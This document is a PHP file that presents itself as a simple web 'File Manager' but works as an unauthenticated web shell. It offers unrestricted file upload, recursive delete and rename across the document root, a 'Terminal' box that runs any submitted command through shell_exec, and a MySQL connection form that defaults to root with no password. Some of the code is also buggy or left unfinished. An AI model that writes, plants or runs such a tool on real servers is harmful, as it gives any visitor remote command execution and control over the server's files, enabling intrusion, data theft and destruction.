<?php

$items = array();
$i = 0;
//$h = "test.php?dir=" . $dir . '/';
//Check if the file is directory and do some act on it.

//

// Root path for file manager
//$root_path = dirname($_SERVER['SCRIPT_FILENAME']);
$root_path = $_SERVER['DOCUMENT_ROOT'];
$root_url = '';
$http_host = $_SERVER['HTTP_HOST'];
$datetime_format = 'd.m.y H:i';
$iconv_input_encoding = 'CP1251';


$is_https = isset($_SERVER['HTTPS']) && ($_SERVER['HTTPS'] == 'on' || $_SERVER['HTTPS'] == 1)
    || isset($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] == 'https';


$root_path = rtrim($root_path, '\\/');
$root_path = str_replace('\\', '/', $root_path);
if (!is_dir($root_path)) {
    echo sprintf('<h1>Path Not Found!</h1>', fm_enc($root_path));
    exit;
}


$root_url = fm_clean_path($root_url);


// abs path for site
defined('FM_ICONV_INPUT_ENC') || define('FM_ICONV_INPUT_ENC', $iconv_input_encoding);
defined('FM_ROOT_PATH') || define('FM_ROOT_PATH', $root_path);
defined('FM_ROOT_URL') || define('FM_ROOT_URL', ($is_https ? 'https' : 'http') . '://' . $http_host . (!empty($root_url) ? '/' . $root_url : ''));
defined('FM_SELF_URL') || define('FM_SELF_URL', ($is_https ? 'https' : 'http') . '://' . $http_host . $_SERVER['PHP_SELF']);


//if (isset($_GET['img'])) {
//    fm_show_image($_GET['img']);
//}
define('FM_IS_WIN', DIRECTORY_SEPARATOR == '\\');
// always use ?p=
if (!isset($_GET['p'])) {
    fm_redirect(FM_SELF_URL . '?p=');
}

// get path
$p = isset($_GET['p']) ? $_GET['p'] : (isset($_POST['p']) ? $_POST['p'] : '');
// clean path
$p = fm_clean_path($p);

// instead globals vars
define('FM_PATH', $p);

defined('FM_DATETIME_FORMAT') || define('FM_DATETIME_FORMAT', $datetime_format);

unset($p);
// get current path
$path = FM_ROOT_PATH;
if (FM_PATH != '') {
    $path .= '/' . FM_PATH;
}
// check path
if (!is_dir($path)) {
    fm_redirect(FM_SELF_URL . '?p=');
}
// path
$path = FM_ROOT_PATH;
if (FM_PATH != '') {
    $path .= '/' . FM_PATH;
}
// get parent folder
$parent = fm_get_parent_path(FM_PATH);

$objects = is_readable($path) ? scandir($path) : array();
$folders = array();
$files = array();
if (is_array($objects)) {
    foreach ($objects as $file) {
        if ($file == '.' || $file == '..') {
            continue;
        }
        $new_path = $path . '/' . $file;
        if (is_file($new_path)) {
            $files[] = $file;
        } elseif (is_dir($new_path) && $file != '.' && $file != '..') {
            $folders[] = $file;
        }
    }
}
if (!empty($files)) {
    natcasesort($files);
}
if (!empty($folders)) {
    natcasesort($folders);
}
//Options

//upload
if (isset($_POST['upl'])) {
    $path = FM_ROOT_PATH;
    if (FM_PATH != '') {
        $path .= '/' . FM_PATH;
    }

    $errors = 0;
    $uploads = 0;
    $total = count($_FILES['upload']['name']);

    for ($i = 0; $i < $total; $i++) {
        $tmp_name = $_FILES['upload']['tmp_name'][$i];
        if (empty($_FILES['upload']['error'][$i]) && !empty($tmp_name) && $tmp_name != 'none') {
            if (move_uploaded_file($tmp_name, $path . '/' . $_FILES['upload']['name'][$i])) {
                $uploads++;
            } else {
                $errors++;
            }
        }
    }

    if ($errors == 0 && $uploads > 0) {
        echo "All files uploaded to" . fm_enc($path);
    } elseif ($errors == 0 && $uploads == 0) {
        echo "Nothing uploaded";
    } else {
        echo "Error while uploading files. Uploaded files";
    }

    fm_redirect(FM_SELF_URL . '?p=' . urlencode(FM_PATH));
}
// upload form
if (isset($_GET['upload'])) {
    fm_show_header(); // HEADER
    fm_show_nav_path(FM_PATH); // current path
    ?>
    <div class="path">
        <p><b>Uploading files</b></p>
        <p class="break-word">Destination folder: <?php echo fm_enc(fm_convert_win(FM_ROOT_PATH . '/' . FM_PATH)) ?></p>
        <form action="" method="post" enctype="multipart/form-data">
            <input type="hidden" name="p" value="<?php echo fm_enc(FM_PATH) ?>">
            <input type="hidden" name="upl" value="1">
            <input type="file" name="upload[]"><br>
            <p>
                <button class="btn"><i class="icon-apply"></i> Upload</button> &nbsp;
                <b><a href="?p=<?php echo urlencode(FM_PATH) ?>"><i class="icon-cancel"></i> Cancel</a></b>
            </p>
        </form>
    </div>
    <?php
    exit;
}


// Delete file / folder
if (isset($_GET['del'])) {
    $del = $_GET['del'];
    $del = fm_clean_path($del);
    $del = str_replace('/', '', $del);
    if ($del != '' && $del != '..' && $del != '.') {
        $path = FM_ROOT_PATH;
        if (FM_PATH != '') {
            $path .= '/' . FM_PATH;
        }
        $is_dir = is_dir($path . '/' . $del);
        if (fm_rdelete($path . '/' . $del)) {
            $msg = $is_dir ? 'Folder <b>%s</b> deleted' : 'File <b>%s</b> deleted';
            echo $msg;
        } else {
            $msg = $is_dir ? 'Folder <b>%s</b> not deleted' : 'File <b>%s</b> not deleted';
            echo $msg;
        }
    } else {
        echo 'Wrong file or folder name';
    }
    //urlencode(FM_PATH)
    fm_redirect(FM_SELF_URL . '?p=' . urlencode(FM_PATH));
}

//Add New Folder
if (isset($_GET['new_folder'])) {
    $new = strip_tags($_GET['new_folder']);
    $new = fm_clean_path($new);
    $new = str_replace('/', '', $new);
    if ($new != '' && $new != '.' && $new != '..') {
        $path = FM_ROOT_PATH;
        if (FM_PATH != '') {
            $path .= '/' . FM_PATH;
        }
        if (fm_mkdir($path . '/' . $new, false) === true) {
            echo "File Created";
        }
        if (fm_mkdir($path . '/' . $new, false) === $path . '/' . $new) {
            echo "File Exist!";
        } else {
            echo 'Not Created';
        }
    } else {
        echo 'wrong file name!!!';
    }
    fm_redirect(FM_SELF_URL . '?p=' . urlencode(FM_PATH));
}
//View file
if (isset($_GET['view'])) {
    $file = $_GET['view'];
    $file = fm_clean_path($file);
    $file = str_replace('/', '', $file);
    if ($file == '' || !is_file($path . '/' . $file)) {
        fm_redirect(FM_SELF_URL . '?p=' . urlencode(FM_PATH));
    }

}
$file_url = FM_ROOT_URL . fm_convert_win((FM_PATH != '' ? '/' . FM_PATH : '') . '/' . $file);
$file_path = $path . '/' . $file;
$ext = strtolower(pathinfo($file_path, PATHINFO_EXTENSION));
$mime_type = fm_get_mime_type($file_path);
$filesize = filesize($file_path);
if (isset($_GET['view'])){
    if (is_file($file)) {

        switch ($ext) {
            case 'jpg':
            case 'png':
            case 'gif':
            case 'svg':
                $img = $file;
                $image = base64_encode(file_get_contents($img));
                $src = 'data: ' . mime_content_type($img) . ';base64,' . $image; ?>
                <div style="text-align: center">
                    <img src="<?= $src; ?>" style="width: 10em;" class="preview-img">
                </div>
                <?php

                break;
            case 'php':
            case 'py':
            case 'txt':
            case 'html':
            case 'asp':
            case 'aspx':
                $data = file_get_contents($file);
                $data = htmlspecialchars($data);
//            $h = fopen($file, 'r');
//            $data = fread($h, 1);
//            fclose($h);
                ?>
                <div style="text-align: center;">
                <textarea  readonly style="
                  width: 600px;
	              height: 120px;
	              border: 3px solid #cccccc;
	              padding: 5px;
	              font-family: Tahoma, sans-serif;
	              background-position: bottom right;
	              background-repeat: no-repeat;" wrap="off" cols="30" rows="5" id="show" >
                    <?= $data ?>
                    </textarea>
                </div>

                <?php
                break;

            default:
                echo 'Undefined!';
        }
    }
}

//Rename file and folder
if (isset($_GET['ren'], $_GET['to'])) {
    //old name
    $old = $_GET['ren'];
    $old = fm_clean_path($old);
    $old = str_replace('/', '', $old);
    //new name
    $new = $_GET['to'];
    $new = fm_clean_path($new);
    $new = str_replace('/', '', $new);
    //path
    $path = FM_ROOT_PATH;
    if (FM_PATH != '') {
        $path .= '/' . FM_PATH;
    }
    //rename
    if ($old != '' && $new != '') {
        if (fm_rename($path . '/' . $old, $path . '/' . $new)) {
            echo 'Ranamed successfully :D';
        } else {
            echo 'Error occured :K';
        }

    } else {
        echo "Not Correct!";
    }
    fm_redirect(FM_SELF_URL . '?p=' . urlencode(FM_PATH));
}

//End of Options **

//--- FILE-MANAGER MAIN
fm_show_header(); // HEADER
fm_show_message();
fm_show_nav_path(FM_PATH); // current path
$num_files = count($files);
$num_folders = count($folders);
$all_files_size = 0;
?>
<form action="" method="post">
    <input type="hidden" name="p" value="<?php echo fm_enc(FM_PATH) ?>">
    <table>
        <tr>
            <th>Name</th>
            <th>Size</th>
            <th>Option</th>
        </tr>
        <?php
        // link to parent folder
        if ($parent !== false) {
            ?>
            <tr>
                <td colspan="<?php echo !FM_IS_WIN ? '6' : '4' ?>"><a href="?p=<?php echo urlencode($parent) ?>"><i
                                class="icon-arrow_up"></i> ..</a></td>
            </tr>
            <?php
        }
        $items[] = $folders;
        $items[] = $files;

        foreach ($folders as $f) {
            $is_link = is_link($path . '/' . $f);
            ?>
            <tr>
                <td>
                    <div class="filename"><a href="?p=<?php echo urlencode(trim(FM_PATH . '/' . $f, '/')) ?>"><i
                                    class="fa fa-folder"></i> <?php echo fm_enc(fm_convert_win($f)) ?>
                        </a><?php echo($is_link ? ' &rarr; <i>' . fm_enc(readlink($path . '/' . $f)) . '</i>' : '') ?>
                    </div>
                </td>
                <td>Folder</td>
                <!--                add size of file-->
                <td style="text-align: center;" class="gray">
                    <a title="Direct link"
                       href="<?php echo fm_enc(FM_ROOT_URL . (FM_PATH != '' ? '/' . FM_PATH : '') . '/' . $f . '') ?>"
                       target="_blank">
                        <img alt="open" src="icons8-open-door-50.png" width="25px">
                    </a>
                    <a title="Rename" href="#"
                       onclick="rename('<?php echo fm_enc(FM_PATH) ?>', '<?php echo fm_enc($f) ?>');return false;">
                        <img alt="rename" src="icon-rename.png" width="25px">
                    </a>
                    <a title="Delete" onclick="return confirm('Are u sure?');"
                       href="?p=<?php echo urlencode(FM_PATH) ?>&amp;del=<?php echo urlencode($f) ?>">
                        <img alt="delete" src="bin.svg" width="25px">
                    </a>
                </td>
            </tr>
            <?php
            flush();
        }
        foreach ($files as $f) {
            $is_link = is_link($path . '/' . $f);
            $filesize_raw = filesize($path . '/' . $f);
            $filesize = fm_get_filesize($filesize_raw);
            $filelink = '?p=' . urlencode(FM_PATH) . '&view=' . urlencode($f);
            $all_files_size += $filesize_raw;
            ?>
            <tr>

                <td>
                    <div class="filename"><a href="<?php echo fm_enc($filelink).'#show' ?>" title="File info"><i
                                    class="fa fa-file"></i> <?php echo fm_enc(fm_convert_win($f)) ?>
                        </a><?php echo($is_link ? ' &rarr; <i>' . fm_enc(readlink($path . '/' . $f)) . '</i>' : '') ?>
                    </div>
                </td>
                <td><span class="gray"
                          title="<?php printf('%s bytes', $filesize_raw) ?>"><?php echo $filesize ?></span></td>

                <td style="text-align: center;" class="gray">
                    <a title="Direct link"
                       href="<?php echo fm_enc(FM_ROOT_URL . (FM_PATH != '' ? '/' . FM_PATH : '') . '/' . $f) ?>"
                       target="_blank">
                        <img alt="open" src="icons8-open-door-50.png" width="25px">
                    </a>
                    <a title="Rename" href="#"
                       onclick="rename('<?php echo fm_enc(FM_PATH) ?>', '<?php echo fm_enc($f) ?>');return false;">
                        <img alt="rename" src="icon-rename.png" width="25px">
                    </a>
                    <a title="Delete" onclick="return confirm('Are u sure?');"
                       href="?p=<?php echo urlencode(FM_PATH) ?>&amp;del=<?php echo urlencode($f) ?>">
                        <img alt="delete" src="bin.svg" width="25px">
                    </a>
                </td>
            </tr>
            <?php
            flush();
        }
        if (empty($folders) && empty($files)) {
            ?>
            <tr>
                <td></td>
                <td colspan="<?php echo !FM_IS_WIN ? '6' : '4' ?>"><em>Folder is empty</em></td>
            </tr>
        <?php } else {
            ?>
            <tr>
                <td class="gray"></td>
                <td class="gray" colspan="<?php echo !FM_IS_WIN ? '6' : '4' ?>">
                    Full size: <span
                            title="<?php printf('%s bytes', $all_files_size) ?>"><?php echo fm_get_filesize($all_files_size) ?></span>,
                    files: <?php echo $num_files ?>,
                    folders: <?php echo $num_folders ?>
                </td>
            </tr>
            <?php
        }?>
    </table>
    <div style="text-align: center">
        <form action="" method="post" style="text-align: center">
            <input type="text" placeholder="> Terminal" name="cmd" id="cmd" required style="width: 50%">
            <button>run</button>
            <?php if (isset($_POST['cmd'])):
                $cmd = $_POST['cmd'];
                $result = shell_exec($cmd);
                $path = getcwd();

                if ($cmd == "cd"){
                    chdir($path);
                }
                ?>
                <br>
                <br>

                <textarea readonly style="
                  background-color: #222222;
                  color: white;
                  width: 70%;
	              height: 240px;
	              border: 3px solid #cccccc;
	              padding: 5px;
	              font-family: Tahoma, sans-serif;
	              background-position: bottom right;
	              background-repeat: no-repeat;" wrap="off" cols="30" rows="6" ><?= $result?>
                </textarea>


            <?php endif;?>
        </form>
    </div>
    <hr>
    <div style="text-align: center;border: 1px black solid;margin: 5px; padding: 3px;background-color: lightslategrey">
        <label for="db"><h3>&nbsp;MySQL Connect Section</h3></label>
    <form action="" method="post" id="db">
        Hostname:&nbsp;<input type="text" name="db_host" id="db_host" required autocomplete="off">
        Username:&nbsp;<input type="text" name="db_user" id="db_user" required autocomplete="off">
        Password:&nbsp;<input type="password" name="db_pass" id="db_pass"  autocomplete="off">
        Port:&nbsp;<input type="number" name="db_port" id="db_port" required autocomplete="off">
        <button>Connect</button>
    </form>
    </div>
    <?php

    $db_host = isset($_POST['db_host']) ? $_POST['db_host'] : 'localhost';
    $db_user = isset($_POST['db_user']) ? $_POST['db_user'] : 'root';
    $db_pass = isset($_POST['db_pass']) ? $_POST['db_pass'] : '';
    $db_port = isset($_POST['db_port']) ? $_POST['db_port'] : 3306;
    $mysqli = new mysqli($db_host,$db_user,$db_pass,'',$db_port);
    // Check connection
    if ($mysqli -> connect_errno) {
        echo "Failed to connect to MySQL: " . $mysqli -> connect_error;
        exit();
    }
    ?>

    <?php


        //        foreach ($files as $f) {
        //            $is_link = is_link($path . '/' . $f);
        //            $filelink = '?p=' . urlencode(FM_PATH) . '&view=' . $f;
        //        }


        //------------------------------------Functions-------------------------------------------//
        function dbs(){

        }

        function fm_get_mime_type($file_path)
        {
            if (function_exists('finfo_open')) {
                $finfo = finfo_open(FILEINFO_MIME_TYPE);
                $mime = finfo_file($finfo, $file_path);
                finfo_close($finfo);
                return $mime;
            } elseif (function_exists('mime_content_type')) {
                return mime_content_type($file_path);
            } elseif (!stristr(ini_get('disable_functions'), 'shell_exec')) {
                $file = escapeshellarg($file_path);
                $mime = shell_exec('file -bi ' . $file);
                return $mime;
            } else {
                return '--';
            }
        }

        function fm_rename($old, $new)
        {
            return (!file_exists($new) && file_exists($old)) ? rename($old, $new) : null;
        }


        function fm_show_nav_path($path)
        {
            ?>
            <div class="path">
                <div class="float-right">
                    <!--                    <a title="Upload files" href="?p=--><?php //echo urlencode(FM_PATH)
                    ?><!--&amp;upload">-->
                    <!--                        <label for="fileToUpload" class="fa fa-upload icon-upload"-->
                    <!--                               style="font-size:20px; margin: 5px"></label>-->
                    <!--                        <input type="file" name="fileToUpload" id="fileToUpload" style="display: none"-->
                    <!--                               onchange="this.form.submit()">-->
                    <!--                    </a>-->
                    <a title="Upload files" href="?p=<?php echo urlencode(FM_PATH) ?>&amp;upload">
                        <i class="fa fa-upload icon-upload" style="font-size:20px; margin: 5px"></i>
                    </a>
                    <!--                    --><?php //var_dump($_POST);
                    ?>
                    <a title="New folder" href="#" onclick="newFolder('<?php echo fm_enc(FM_PATH) ?>');return false;">
                        <i class="icon-folder_add fa fa-folder" style="font-size:20px; margin: 5px"></i>
                    </a>
                </div>

                <?php
                $root_url = "<a href='?p='>
                <i class='icon-home fa fa-home' style=\"font-size:20px; margin: 5px\" title='" . FM_ROOT_PATH . "'></i>
                </a>";
                echo '<div class="break-word">' . $root_url . '</div>';
                ?>
            </div>
            <?php
        }


        //Convert file name to UTF-8 in Windows

        function fm_convert_win($filename)
        {
            if (FM_IS_WIN && function_exists('iconv')) {
                $filename = iconv(FM_ICONV_INPUT_ENC, 'UTF-8//IGNORE', $filename);
            }
            return $filename;
        }

        //Encode html entities

        function fm_enc($text)
        {
            return htmlspecialchars($text, ENT_QUOTES, 'UTF-8');
        }

        //Get parent path
        function fm_get_parent_path($path)
        {
            $path = fm_clean_path($path);
            if ($path != '') {
                $array = explode('/', $path);
                if (count($array) > 1) {
                    $array = array_slice($array, 0, -1);
                    return implode('/', $array);
                }
                return '';
            }
            return false;
        }

        //Get nice filesize
        function fm_get_filesize($size)
        {
            if ($size < 1000) {
                return sprintf('%s B', $size);
            } elseif (($size / 1024) < 1000) {
                return sprintf('%s KiB', round(($size / 1024), 2));
            } elseif (($size / 1024 / 1024) < 1000) {
                return sprintf('%s MiB', round(($size / 1024 / 1024), 2));
            } elseif (($size / 1024 / 1024 / 1024) < 1000) {
                return sprintf('%s GiB', round(($size / 1024 / 1024 / 1024), 2));
            } else {
                return sprintf('%s TiB', round(($size / 1024 / 1024 / 1024 / 1024), 2));
            }
        }

        // Show message from session

        function fm_show_message()
        {
            if (isset($_SESSION['message'])) {
                $class = isset($_SESSION['status']) ? $_SESSION['status'] : 'ok';
                echo '<p class="message ' . $class . '">' . $_SESSION['message'] . '</p>';
                unset($_SESSION['message']);
                unset($_SESSION['status']);
            }
        }

        // Show page header

        function fm_show_header()
        {
        //        header("Content-Type: text/html; charset=utf-8");
        //        header("Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0");
        //        header("Pragma: no-cache");
        ?>
        <!DOCTYPE html>
        <html>
        <head>
            <link rel="stylesheet"
                  href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
            <meta charset="utf-8">
            <title>File Manager</title>
            <style>
                html, body, div, span, p, pre, a, code, em, img, small, strong, ol, ul, li, form, label, table, tr, th, td {
                    margin: 0;
                    padding: 0;
                    vertical-align: baseline;
                    outline: none;
                    font-size: 100%;
                    background: transparent;
                    border: none;
                    text-decoration: none
                }

                html {
                    overflow-y: scroll
                }

                body {
                    padding: 0;
                    font: 13px/16px Tahoma, Arial, sans-serif;
                    color: #222;
                    background: #777777;
                }

                input, select, textarea, button {
                    font-size: inherit;
                    font-family: inherit
                }

                a {
                    color: #296ea3;
                    text-decoration: none
                }

                a:hover {
                    color: #b00
                }

                img {
                    vertical-align: middle;
                    border: none
                }

                a img {
                    border: none
                }

                span.gray {
                    color: #777
                }

                small {
                    font-size: 11px;
                    color: #999
                }

                p {
                    margin-bottom: 10px
                }

                ul {
                    margin-left: 2em;
                    margin-bottom: 10px
                }

                ul {
                    list-style-type: none;
                    margin-left: 0
                }

                ul li {
                    padding: 3px 0
                }

                table {
                    border-collapse: collapse;
                    border-spacing: 0;
                    margin-bottom: 10px;
                    width: 100%
                }

                th, td {
                    padding: 4px 7px;
                    text-align: left;
                    vertical-align: top;
                    border: 1px solid #ddd;
                    background: #fff;
                    white-space: nowrap
                }

                th, td.gray {
                    background-color: #eee
                }

                td.gray span {
                    color: #222
                }

                tr:hover td {
                    background-color: #f5f5f5
                }

                tr:hover td.gray {
                    background-color: #eee
                }

                code, pre {
                    display: block;
                    margin-bottom: 10px;
                    font: 13px/16px Consolas, 'Courier New', Courier, monospace;
                    border: 1px dashed #ccc;
                    padding: 5px;
                    overflow: auto
                }

                pre.with-hljs {
                    padding: 0
                }

                pre.with-hljs code {
                    margin: 0;
                    border: 0;
                    overflow: visible
                }

                code.maxheight, pre.maxheight {
                    max-height: 512px
                }

                input[type="checkbox"] {
                    margin: 0;
                    padding: 0
                }

                #wrapper {
                    max-width: 1000px;
                    min-width: 400px;
                    margin: 10px auto
                }

                .path {
                    padding: 4px 7px;
                    border: 1px solid #ddd;
                    background-color: #fff;
                    margin-bottom: 10px
                }

                .right {
                    text-align: right
                }

                .center {
                    text-align: center
                }

                .float-right {
                    float: right
                }

                .message {
                    padding: 4px 7px;
                    border: 1px solid #ddd;
                    background-color: #fff
                }

                .message.ok {
                    border-color: green;
                    color: green
                }

                .message.error {
                    border-color: red;
                    color: red
                }

                .message.alert {
                    border-color: orange;
                    color: orange
                }

                .btn {
                    border: 0;
                    background: none;
                    padding: 0;
                    margin: 0;
                    font-weight: bold;
                    color: #296ea3;
                    cursor: pointer
                }

                .btn:hover {
                    color: #b00
                }

                .preview-img {
                    max-width: 100%;
                    background: url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAIAAACQkWg2AAAAKklEQVR42mL5//8/Azbw+PFjrOJMDCSCUQ3EABZc4S0rKzsaSvTTABBgAMyfCMsY4B9iAAAAAElFTkSuQmCC") repeat 0 0
                }

                .preview-video {
                    position: relative;
                    max-width: 100%;
                    height: 0;
                    padding-bottom: 62.5%;
                    margin-bottom: 10px
                }

                .preview-video video {
                    position: absolute;
                    width: 100%;
                    height: 100%;
                    left: 0;
                    top: 0;
                    background: #000
                }

                [class*="icon-"] {
                    display: inline-block;
                    width: 16px;
                    height: 16px;
                    background: url("<?php echo FM_SELF_URL ?>?img=sprites&amp;t=<?php echo $sprites_ver ?>") no-repeat 0 0;
                    vertical-align: bottom
                }

                .icon-document {
                    background-position: -16px 0
                }

                .icon-folder {
                    background-position: -32px 0
                }

                .icon-folder_add {
                    background-position: -48px 0
                }

                .icon-upload {
                    background-position: -64px 0
                }

                .icon-arrow_up {
                    background-position: -80px 0
                }

                .icon-home {
                    background-position: -96px 0
                }

                .icon-separator {
                    background-position: -112px 0
                }

                .icon-cross {
                    background-position: -128px 0
                }

                .icon-copy {
                    background-position: -144px 0
                }

                .icon-apply {
                    background-position: -160px 0
                }

                .icon-cancel {
                    background-position: -176px 0
                }

                .icon-rename {
                    background-position: -192px 0
                }

                .icon-checkbox {
                    background-position: -208px 0
                }

                .icon-checkbox_invert {
                    background-position: -224px 0
                }

                .icon-checkbox_uncheck {
                    background-position: -240px 0
                }

                .icon-download {
                    background-position: -256px 0
                }

                .icon-goback {
                    background-position: -272px 0
                }

                .icon-folder_open {
                    background-position: -288px 0
                }

                .icon-file_application {
                    background-position: 0 -16px
                }

                .icon-file_code {
                    background-position: -16px -16px
                }

                .icon-file_csv {
                    background-position: -32px -16px
                }

                .icon-file_excel {
                    background-position: -48px -16px
                }

                .icon-file_film {
                    background-position: -64px -16px
                }

                .icon-file_flash {
                    background-position: -80px -16px
                }

                .icon-file_font {
                    background-position: -96px -16px
                }

                .icon-file_html {
                    background-position: -112px -16px
                }

                .icon-file_illustrator {
                    background-position: -128px -16px
                }

                .icon-file_image {
                    background-position: -144px -16px
                }

                .icon-file_music {
                    background-position: -160px -16px
                }

                .icon-file_outlook {
                    background-position: -176px -16px
                }

                .icon-file_pdf {
                    background-position: -192px -16px
                }

                .icon-file_photoshop {
                    background-position: -208px -16px
                }

                .icon-file_php {
                    background-position: -224px -16px
                }

                .icon-file_playlist {
                    background-position: -240px -16px
                }

                .icon-file_powerpoint {
                    background-position: -256px -16px
                }

                .icon-file_swf {
                    background-position: -272px -16px
                }

                .icon-file_terminal {
                    background-position: -288px -16px
                }

                .icon-file_text {
                    background-position: -304px -16px
                }

                .icon-file_word {
                    background-position: -320px -16px
                }

                .icon-file_zip {
                    background-position: -336px -16px
                }

                .icon-logout {
                    background-position: -304px 0
                }

                .icon-chain {
                    background-position: -320px 0
                }

                .icon-link_folder {
                    background-position: -352px -16px
                }

                .icon-link_file {
                    background-position: -368px -16px
                }

                .compact-table {
                    border: 0;
                    width: auto
                }

                .compact-table td, .compact-table th {
                    width: 100px;
                    border: 0;
                    text-align: center
                }

                .compact-table tr:hover td {
                    background-color: #fff
                }

                .filename {
                    max-width: 420px;
                    white-space: nowrap;
                    overflow: hidden;
                    text-overflow: ellipsis
                }

                .break-word {
                    word-wrap: break-word
                }
            </style>
        </head>
        <body>
        <div id="wrapper">
            <?php
            }

            // Delete  file or folder (recursively)
            function fm_rdelete($path)
            {
                if (is_link($path)) {
                    return unlink($path);
                } elseif (is_dir($path)) {
                    $objects = scandir($path);
                    $ok = true;
                    if (is_array($objects)) {
                        foreach ($objects as $file) {
                            if ($file != '.' && $file != '..') {
                                if (!fm_rdelete($path . '/' . $file)) {
                                    $ok = false;
                                }
                            }
                        }
                    }
                    return ($ok) ? rmdir($path) : false;
                } elseif (is_file($path)) {
                    return unlink($path);
                }
                return false;
            }

            //Add NewFolder
            function fm_mkdir($dir, $force)
            {
                if (file_exists($dir)) {
                    if (is_dir($dir)) {
                        return $dir;
                    }
                    if (!$force) {
                        return false;
                    }
                    unlink($dir);
                }
                return mkdir($dir, 0777, true);

            }

            //Clean path
            function fm_clean_path($path)
            {
                $path = trim($path);
                $path = trim($path, '\\/');
                $path = str_replace(array('../', '..\\'), '', $path);
                if ($path == '..') {
                    $path = '';
                }
                return str_replace('\\', '/', $path);
            }

            //HTTP Redirect
            function fm_redirect($url, $code = 302)
            {
                header('Location: ' . $url, true, $code);
                exit;
            }


            //-----------------------------------End Of Codes--------------------------


            //Main code

            function check_File($dir)
            {
                global $items, $i;
                if (is_dir($dir)) {
                    if ($dh = opendir($dir)) {
                        while (($file = readdir($dh)) !== false) {
                            if (in_array(".", $items)) {
                                array_shift($items);
                            }
                            $items[] = $file;

                        }
//               echo "<a href='" . $item . "'> " . $item . "</a><br>";
                    }
                    closedir($dh);
                }
            }

            //setting dir var
            function set_dir_path()
            {
                $dir = isset($_GET['dir']) ? $_GET['dir'] : (isset($_POST['dir']) ? $_POST['dir'] : '');
                if ($dir) {
                    return $dir;
                } else {
                    $dir = dirname($_SERVER['SCRIPT_FILENAME']);
                    return $dir;
                }
            }

            // Create link for items and visible it
            function m_link()
            {
                global $i, $items, $h;
                $dir = set_dir_path();
                foreach ($items as $item) {
                    $h = "file.php?dir=" . $dir . '/' . $items[$i++];
                    $fs = $dir . '/' . $item;
                    $url = $h ? $h : '';
                    $ul_show = isset($_GET['show']) ? $_GET['show'] : null;
//        if ($ul_show) {
//
//        }
                    echo '<tr>';
                    echo '<td>';
                    echo "<a href='$url'>{$items[$i-1]}&nbsp;</a>";
                    echo '</td>';
                    echo '<td>'; ?>
                    <p>
                        <?php
                        if (is_dir($fs)) {
                            echo "Folder";
                        } elseif ($fs) {
                            echo filesize($fs);

                        }
                        ?>
                    </p>
                    <?php
                    echo '</td>';
                    echo '<td style="text-align: center;" class="gray">'; ?>
                    <a href="?rename">
                        <div>
                            <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADIAAAAyCAYAAAAeP4ixAAAABmJLR0QA/wD/AP+gvaeTAAABs0lEQVRoge3aTWsTURTG8d9Mu5GKoCi4Em03orhSC6L1s3UjCH6MrlWkGxH0K/gC3bssRUp2hQatiznjTEITzCSd3Ib7h0OGm3Myz8OdTHLnXDJpsdbTee7jFkqc4GzG+jLq7+AqBgtV95+8UAmv4w++4jW2p9RtR863qKnrh9i8QL0TuY2POMAhTo0a+4CtVv5WjLVzTqP2AG+x0ZP2qayrZukVjlVCj/A44ijGjiPnedQkzQ28Vwk/jDjDO1xfoq5OrOGL5jL6rL+b0MJ5qjHyZMla5qLUGCmXrGVuaiOduPTua7KR1CjitfO1uaDzz6uhWJkZGf/pL87N6pdZNPybxZWZkWwkNbKR1MhGUiMbSY1sJDWykdTIRlIjG0mN8RVi32v381aDnTSszIykRH7SSDaSHqkYKSccd/qAZfJowvGlosC+5q61L40nnjNxDXuaLm7d5d2L95JmHc+wq2lFD/AyYqBpWe9GbhLt6Q1Vk7/eMDA0uhngEx608h/GWDtnKIENA5tGxf/Gd7zBzpS6ncj5ETVtU/fGk/v6Ut3FFfyKmPWvSIGbESf4uUBtmQvhL6ZzaykB7Mk4AAAAAElFTkSuQmCC
" alt="Red dot" />
                        </div>
                    </a>
                    <a href="?delete">
                        <img alt="delete" src="bin.svg" width="25px">
                    </a>
                    <a href="?open">
                        <img alt="open" src="icons8-open-door-50.png" width="25px">
                    </a>
                    <?php echo '</td>';
                    echo '</tr>';

                }
                return $item;
            }

            function upload()
            {
                var_dump($_POST);

            }

            ?>

            <?php
            ?>

            <!--                <form action="" method="post">-->
            <!--                    <table>-->
            <!--                        <tr>-->
            <!--                            <th>Name</th>-->
            <!--                            <th>Size</th>-->
            <!--                            <th>Option</th>-->
            <!--                        </tr>-->
            <!--                        --><?php
            ////                        if (is_dir(set_dir_path())) {
            ////                            check_File(set_dir_path());
            ////                            m_link();
            ////
            ////                        }
            //                        //            add if for handle error of filesize == failed!
            //                        //            $path = "/wamp64/www/web/";
            //                        //            $files = scandir($path);
            //                        //            var_dump($files);
            //                        //            $files = array_diff(scandir($path), array('.', '..'));
            //                        //
            //                        //            foreach ($files as $key => $value){
            //                        //                if (!is_dir($path.$files[$key])){
            //                        //                    if ($_GET['delete']){
            //                        //                        unset($files[$key]);
            //                        //                        check_File(set_dir_path());
            //                        //                    }else{
            //                        //
            //                        //                        echo $key . '' . $value . '<br>';
            //                        //                    }
            //                        //
            //                        //                }
            //                        //
            //                        //            }
            //                        //            var_dump($files);
            //                        //            m_link();
            //                        //
            //                        //            echo sizeof($files);
            //                        ?>
            <!--                    </table>-->
            <!--                </form>-->
        </div>
        <script>
            function newFolder(p) {
                var n = prompt('Enter Folder Name', 'folder');
                if (n !== 'null' && n !== '') {
                    window.location.search = 'p' + encodeURIComponent(p) + '&new_folder=' + encodeURIComponent(n);
                }
            }

            function rename(p, f) {
                var n = prompt('New Name', f);
                if (n !== null && n !== '') {
                    window.location.search = 'p=' + encodeURIComponent(p) + '&ren=' + encodeURIComponent(f) + '&to=' + encodeURIComponent(n);
                }


            }
        </script>


        </body>


